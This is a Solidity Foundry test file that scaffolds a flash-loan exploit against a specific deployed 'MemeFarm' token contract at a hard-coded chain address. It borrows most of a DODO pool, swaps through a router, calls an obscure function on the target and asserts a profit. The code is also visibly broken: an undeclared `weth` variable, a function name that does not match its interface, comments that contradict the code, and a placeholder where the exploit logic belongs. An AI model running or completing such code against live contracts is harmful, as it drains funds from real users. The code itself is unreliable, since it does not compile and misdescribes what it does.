// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface IMemeFarm {
    function ________() external returns (address);
    function teamWalletAddress() external returns (address);
    function deadAddress() external returns (address);
    function _IsExcludeFromFee(address) external returns (bool);
    function isWalletLimitExempt(address) external returns (bool);
    function isTxLimitExempt(address) external returns (bool);
    function isMarketPair(address) external returns (bool);
    function _________(address) external returns (bool);
    function _buyLiquidityFee() external returns (uint256);
    function _buyMarketingFee() external returns (uint256);
    function _buyTeamFee() external returns (uint256);
    function _sellLiquidityFee() external returns (uint256);
    function _sellMarketingFee() external returns (uint256);
    function _sellTeamFee() external returns (uint256);
    function _liquidityShare() external returns (uint256);
    function _marketingShare() external returns (uint256);
    function _teamShare() external returns (uint256);
    function _totalTaxIfBuying() external returns (uint256);
    function _totalTaxIfSelling() external returns (uint256);
    function _totalDistributionShares() external returns (uint256);
    function _maxTxAmount() external returns (uint256);
    function _walletMax() external returns (uint256);
    function uniswapV2Router() external returns (address);
    function uniswapPair() external returns (address);
    function swapAndLiquifyEnabled() external returns (bool);
    function swapAndLiquifyByLimitOnly() external returns (bool);
    function checkWalletLimit() external returns (bool);
    function owner() external view returns (address);
    function transferOwnership(address) external;
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function allowance(address,address) external view returns (uint256);
    function increaseAllowance(address,uint256) external returns (bool);
    function decreaseAllowance(address,uint256) external returns (bool);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function setlsExcIudeFromFee(address,bool) external;
    function setBuyTaxes(uint256,uint256,uint256) external;
    function setAllTaxes(uint256,uint256,uint256) external;
    function setDistributionSettings(uint256,uint256,uint256) external;
    function enableDisableWalletLimit(bool) external;
    function setIsWalletLimitExempt(address,bool) external;
    function setNumTokensBeforeSwap(uint256) external;
    function setMarketinWalleAddress(address) external;
    function setTeamWalletAddress(address) external;
    function setSwapAndLiquifyEnabled(bool) external;
    function setSwapAndLiquifyByLimitOnly(bool) external;
    function getCirculatingSupply() external view returns (uint256);
    function changeRouterVeslon(address) external;
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function setMaxTxAmount(uint256) external;
    function qwidji(address,bool) external;
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
    IWETH(weth).deposit{value: amount}(); // Convert WETH to ETH for the contract
    address[] memory path = new address[](2);
    path[0] = address(valuableToken); // Valuable token to swap
    path[1] = uniswapRouter.WETH(); // Get WETH back

    // Step 1: Swap half valuableToken for ETH
    uint256 halfAmount = amount / 2; 
    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        halfAmount,
        0, // Accept any amount of WETH
        path,
        address(this),
        block.timestamp + 360 // Deadline
    );

    // Step 2: Interact with MemeFarm, or trigger functions on it that may lead to more WETH
    IMemeFarm(target).______();

    // Step 3: Complete additional operations that may yield more tokens or ETH
    // Placeholder for additional exploit logic

    // Step 4: Swap all remaining tokens back for WETH
    uint256 remainingAmount = valuableToken.balanceOf(address(this));
    if (remainingAmount > 0) {
        valuableToken.approve(address(uniswapRouter), remainingAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            remainingAmount,
            0, // Accept any amount of ETH
            path,
            address(this),
            block.timestamp + 360 // Deadline
        );
    }

    // Withdraw all the WETH from the contract balance
    uint256 finalWETHBalance = address(this).balance; // Check the WETH balance
    IWETH(weth).withdraw(finalWETHBalance); // Withdraw the WETH to this contract
}
}


